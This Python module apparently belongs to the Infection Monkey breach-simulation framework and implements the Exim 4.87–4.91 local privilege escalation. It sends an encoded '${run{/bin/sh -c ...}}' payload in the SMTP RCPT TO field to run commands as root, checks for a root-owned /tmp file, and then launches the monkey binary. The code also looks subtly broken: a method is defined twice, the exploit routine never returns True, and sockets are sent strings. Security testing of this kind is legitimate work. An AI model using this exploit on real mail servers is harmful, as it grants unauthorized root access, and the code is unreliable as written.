"""
    Implementation is based on Exim 4.87 - 4.91 - Local Privilege Escalation
    https://www.exploit-db.com/exploits/46996
    Exim 4.87 - 4.91 is vulnerable
"""
import re
import os
import random
import string
import socket
from infection_monkey.pe import HostPrivExploiter
from logging import getLogger

LOG = getLogger(__name__)

__author__ = "D3fa1t"

RUN_PAYLOAD=r"${run{\x2fbin\x2fsh\t-c\t\x22COMMAND_HERE\x22}}@localhost" # payload with placeholder
LOCALHOST= "localhost" # local priv escalation
SMTP_PORT= 25   # port to connect to
RECV_128 = 128  # In Bytes


def shell(cmd):
    """
    :param cmd: Runs the cmd on a shell
    :return: returns the output
    """
    return os.popen(cmd).read()[:-1]


def encode(cmd):
    """

    :param cmd: encodes the command to be run as root
    :return: cmd encoded in PAYLOAD
    """
    cmd = re.sub('/', r"\x2f", cmd)
    cmd = re.sub(' ', r"\\t", cmd)
    cmd = "%r"%cmd
    cmd = cmd.strip("'")
    return re.sub("COMMAND_HERE", cmd, RUN_PAYLOAD)


class eximExploiter(HostPrivExploiter):
    def socket_connect(self, s, ip_addr, port):
        try:
            s.connect((ip_addr, port))
            return True
        except socket.error as e:
            LOG.error('Failed to connect to %s', self.host.ip_addr)
        return False

    def socket_connect(self, s, ip_addr, port):
        try:
            s.connect((ip_addr, port))
            return True
        except socket.error as e:
            LOG.error('Failed to connect to %s', self.host.ip_addr)
        return False

    def socket_send_recv(self, s, message):
        try:
            s.send(message)
            return s.recv(RECV_128).decode('utf-8')
        except socket.error as e:
            LOG.error('Failed to send payload to %s', self.host.ip_addr)
        return False

    def socket_send(self, s, message):
        try:
            s.send(message)
            return True
        except socket.error as e:
            LOG.error('Failed to send payload to %s', self.host.ip_addr)
        return False

    def exploit(self, command):
        """
        exploit() runs the command as the root user
        :param command: Command to be run as root
        :return: False if it is not running Exim
        """
        hostname = shell("hostname -f")
        command = encode(command)
        smtp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        if self.socket_connect(smtp_socket, LOCALHOST, SMTP_PORT):
            # Check to verify if the server is Exim
            if "Exim" not in smtp_socket.recv(RECV_128).decode('utf-8'):
                return False
        self.socket_send_recv(smtp_socket, "HELO " + hostname + '\n')
        self.socket_send_recv(smtp_socket, "MAIL FROM:<>\n")
        self.socket_send_recv(smtp_socket, "RCPT TO:<" + command + ">\n")
        self.socket_send(smtp_socket, "DATA\n")
        for i in range(1, 32):
            self.socket_send(smtp_socket, "Received: " + str(i) + "\n")
        self.socket_send(smtp_socket, "\n")
        self.socket_send(smtp_socket, ".\n")

    def try_priv_esc(self, command):
        """
        Creates a rand file at /tmp as root, if it succeeds then it runs monkey as root user
        :param command: The file path of the monkey
        :return: True if  PE is successful and False if it fails
        """
        alphabet = string.ascii_lowercase
        filename = ''.join(random.choice(alphabet) for _ in range(10))
        touch = 'touch /tmp/'+filename
        if not self.exploit(touch):
            return False

        if os.stat("/tmp/"+filename).st_uid == 0:
            # Exploit is successful
            self.exploit(command)
            return True

        return False

